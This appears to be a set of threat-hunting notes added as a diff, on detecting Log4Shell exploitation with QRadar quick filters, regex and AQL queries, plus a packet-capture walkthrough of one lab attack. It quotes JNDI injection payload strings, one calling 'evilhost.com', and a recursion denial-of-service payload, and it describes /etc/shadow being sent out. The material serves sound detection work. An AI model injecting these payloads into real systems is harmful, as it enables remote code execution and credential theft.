@@ -1,0 +1,125 @@
+# Link to malware traffic analysis page where we got the PCAP:
+https://www.malware-traffic-analysis.net/2021/12/14/index.html
+
+# Searching log4j exploitation/probe/scanning attempts using QNI
+
+# Quick Filter Samples
+# Searching log4j exploitation/probe/scanning attempts on all of the headers (We are searching on the Payload)
+
+# Please notice that, anything that a user supplies and gets parsed by log4j is a potential input vector
+# So, the searches below could help you to start searching for exploitation/probing/scanning using different attack vectors
+
+# Malicious Payload 													Quick Filter Search
+---------------------------------------------------------------------------------------------
+User-Agent: ${jndi:ldap://IP/path}										jndi
+																		JNDI
+---------------------------------------------------------------------------------------------
+User-Agent: ${jndi:ldap://IP/path}										jndi AND ldap
+																		"jndi ldap"~1
+---------------------------------------------------------------------------------------------
+Authorization: Basic ${jndi:ldap://IP:port/Exploit}						"jndi ldap"~1
+																		jndi AND (ldap OR dns)
+																		
+---------------------------------------------------------------------------------------------
+User-Agent: ${jndi:dns://IP/securityscan-http80}						jndi AND dns 
+Referer: ${jndi:dns://IPsecurityscan-http80}																		
+---------------------------------------------------------------------------------------------	
+
+Also use the quick filter *jndi																	
+
+# Based on examples provided by Florian Roth 
+# https://gist.github.com/Neo23x0/e4c8b03ff8cdf1fa63b7d15db6e3860b
+All-Payloads-shown-above												jndi AND (ldap OR rmi OR dns OR nis OR iiop OR corba OR nds OR http)
+All-Payloads-shown-above												jndi AND (ldap OR ldaps OR rmi OR dns OR nis OR iiop OR corba OR nds OR http OR https)
+
+
+# Searching log4j exploitation/probe/scanning attempts on User Agent or Referrer
+HTTP User Agent contains any of jndi
+	To improve your search
+	Filter out by Application to include Indexed properties.
+
+HTTP Referrer  contains any of jndi
+	Filter out by Application to include Indexed properties.
+	
+	
+# Using Regular Expression on Payload based on Adam Frank's regex
+# https://community.ibm.com/community/user/security/blogs/adam-frank/2021/12/13/detection-of-log4shell-using-qradar
+Source Payload Matches Regular Expression is .*\$(\{|%7B)[^\}]*?j.*?n.*?d.*?i.*
+		Compare performance versus Quickl Filter
+		
+# Mitchell Hale wrote an AQL function
+#  https://github.com/Mitchell-IBM/IBM-QRadar-AQL-log4shell-detector/releases
+select "firstPacketTime" as 'First Packet Time',"endTime" as 'Storage Time',"sourceIP" as 'Source IP',"sourcePort" as 'Source Port',"destinationIP" as 'Destination IP',"destinationPort" as 'Destination Port',"sourceBytes" as 'Source Bytes',"destinationBytes" as 'Destination Bytes',(SourceBytes + DestinationBytes) as 'Total Bytes',
+(SourcePackets + DestinationPackets) as 'Total Packets',"protocolId" as 'Protocol',APPLICATIONNAME(applicationid) as 'Application',"flowSource" as 'Flow Source'
+from flows 
+where EXPLOITDETECT::LOG4J(UTF8(sourcepayload),40) order by "endTime" desc last 24 HOURS
+	
+
+Summary of Apache Log4j Security Vulnerabilities
+CVE-2021-44228:	Apache Log4j2 JNDI features do not protect against attacker controlled LDAP and other JNDI related endpoints.
+	Fixed in Log4j 2.15.0 (Java 8)
+		A new CVE (CVE-2021-45046, see above) was raised for this.
+	Consequences: Gain Access
+	# Payload sample: User-Agent: ${jndi:ldap://IP/path}
+CVE-2021-45046: Apache Log4j2 Thread Context Lookup Pattern vulnerable to remote code execution in certain non-default configurations
+	Fixed in Log4j 2.12.2 (Java 7) and Log4j 2.16.0 (Java 8)
+	# Payload sample: ${jndi:ldap://127.0.0.1#evilhost.com:1389/a}
+	Consequences: Gain Access
+CVE-2021-45105: Apache Log4j2 does not always protect from infinite recursion in lookup evaluation
+	Fixed in Log4j 2.17.0 (Java 8)
+	# Payload sample: ${${::-${::-$${::-j}}}}
+	Consequences: Denial of Service (edited) 
+	
+
+
+# Network Analysis by Polo @leopoldoagr
+# Packet Sample: https://github.com/cyberxml/log4j-poc/blob/main/data/log4j-webapp.pcap
+# Threat Hunting - Post Exploitation Example
+# Step 1. Do we have the Magic word on a Destination Payload?
+select * from flows where FORMAT::PAYLOAD_TO_HEX(destinationpayload) ilike '%CA FE BA BE%' last 180 MINUTES 
+
+# Step 2. Using the Source IP from Step 1, search for EXPLOITDETECT::LOG4J
+select * from flows 
+where (sourceip = '172.16.238.10' OR destinationip = '172.16.238.10')
+AND EXPLOITDETECT::LOG4J(UTF8(sourcepayload),40) 
+last 180 MINUTES
+
+# Network Analysis by Polo @leopoldoagr
+# Packet Sample: https://github.com/cyberxml/log4j-poc/blob/main/data/log4j-webapp.pcap
+
+# Attacker: Exploits log4j: 172.16.238.1
+# Attacker: Malicious LDAP Server & WWW Hosting Java Class: 172.16.238.11
+# Attacker: Machine used for Exfiltration: 10.10.10.31
+# Vulnerable Server & Victim: 172.16.238.10
+
+# MITRE TACTIC: Brief Description
+# Initial Access: Attempt to Exploit log4j using jndi and ldap
+4	2021-12-13 14:03:35.415338	172.16.238.1	172.16.238.10	HTTP	714	POST /log4shell/login HTTP/1.1  (application/x-www-form-urlencoded)
+
+# Execution: LDAP Server responds with directory information containing the malicious class
+17	2021-12-13 14:03:35.885952	172.16.238.11	172.16.238.10	TCP	215	1389 → 57650 [PSH, ACK] Seq=15 Ack=84 Win=29056 Len=147 TSval=702596143 TSecr=4062778071
+	# You can identify different keywords on the Payload:
+	# objectClass0...0...2.16.840.1.113730.3.4.20.....d....a0..0..
+	# javaClassName1...foo0*..javaCodeBase1...http://172.16.238.11:80/0$..objectClass1...javaNamingReference0...javaFactory1	..Exploit0..
+
+# Execution: Vulnerable Server requests Malicious Class Exploit.class
+23	2021-12-13 14:03:35.913533	172.16.238.10	172.16.238.11	HTTP	276	GET /Exploit.class HTTP/1.1
+
+# Execution: Frames with the Magic Word 0xCAFEBABE
+27	2021-12-13 14:03:35.916504	172.16.238.11	172.16.238.10	HTTP	1420	HTTP/1.0 200 OK  (application/java-vm)
+413	2021-12-13 14:03:54.641984	172.16.238.11	172.16.238.10	HTTP	1420	HTTP/1.0 200 OK  (application/java-vm)
+
+# POST EXPLOITATION
+# Credential-Access: Vulnerable Server sends out content of /etc/shadow
+37	2021-12-13 14:03:43.233401	10.10.10.31	172.16.238.10	TCP	71	9001 → 55408 [PSH, ACK] Seq=1 Ack=1 Win=29056 Len=3 TSval=548382743 TSecr=2925003407
+
+# Detecting Exploitation look for IP address ending in 31
+select * from flows 
+where (sourceip = '172.16.238.10' OR destinationip = '172.16.238.10')
+last 180 MINUTES
+	
+# AQL - log4j 	
+
+SELECT "HTTP User Agent" AS 'HTTP User Agent', MIN("firstPacketTime") AS 'First Packet Time (Minimum)', UniqueCount("sourceIP") AS 'Source IP (Unique Count)', UniqueCount("destinationIP") AS 'Destination IP (Unique Count)', UniqueCount("destinationPort") AS 'Destination Port (Unique Count)', UniqueCount("protocolId") AS 'Protocol (Unique Count)', UniqueCount(APPLICATIONNAME(applicationid)) AS 'Application (Unique Count)', UniqueCount("Request URL") AS 'Request URL (Unique Count)', UniqueCount("HTTP Referrer") AS 'HTTP Referrer (Unique Count)', UniqueCount("HTTP Host") AS 'HTTP Host (Unique Count)', UniqueCount("File Name") AS 'File Name (Unique Count)', COUNT(*) AS 'Count' from flows where ( ( ( "HTTP User Agent"='${jndi:dns://45.83.64.1/securityscan-http80}' AND (APPLICATIONNAME(applicationid)='HttpWeb') or (APPLICATIONNAME(applicationid)>='HttpWeb.' and APPLICATIONNAME(applicationid)<='HttpWeb/') or (APPLICATIONNAME(applicationid)='Web') or (APPLICATIONNAME(applicationid)>='Web.' and APPLICATIONNAME(applicationid)<='Web/') ) AND "endTime">='1639443060000' ) AND "endTime"<='1639702260000' ) GROUP BY "HTTP User Agent" order by "Count" desc LIMIT 1000 last 3 hours
+
+SELECT "HTTP User Agent" AS 'HTTP User Agent', MIN("firstPacketTime") AS 'First Packet Time (Minimum)', UniqueCount("sourceIP") AS 'Source IP (Unique Count)', UniqueCount("destinationIP") AS 'Destination IP (Unique Count)', UniqueCount("destinationPort") AS 'Destination Port (Unique Count)', UniqueCount("protocolId") AS 'Protocol (Unique Count)', UniqueCount(APPLICATIONNAME(applicationid)) AS 'Application (Unique Count)', UniqueCount("Request URL") AS 'Request URL (Unique Count)', UniqueCount("HTTP Referrer") AS 'HTTP Referrer (Unique Count)', UniqueCount("HTTP Host") AS 'HTTP Host (Unique Count)', UniqueCount("File Name") AS 'File Name (Unique Count)', COUNT(*) AS 'Count' from flows where ( ( ( ( "HTTP Referrer"='${jndi:dns://45.83.64.1/securityscan-http80}' AND "HTTP User Agent" != 'null' ) AND (APPLICATIONNAME(applicationid)='HttpWeb') or (APPLICATIONNAME(applicationid)>='HttpWeb.' and APPLICATIONNAME(applicationid)<='HttpWeb/') or (APPLICATIONNAME(applicationid)='Web') or (APPLICATIONNAME(applicationid)>='Web.' and APPLICATIONNAME(applicationid)<='Web/') ) AND "endTime">='1639443120000' ) AND "endTime"<='1639702320000' ) GROUP BY "HTTP User Agent" order by "Count" desc LIMIT 1000 last 3 days
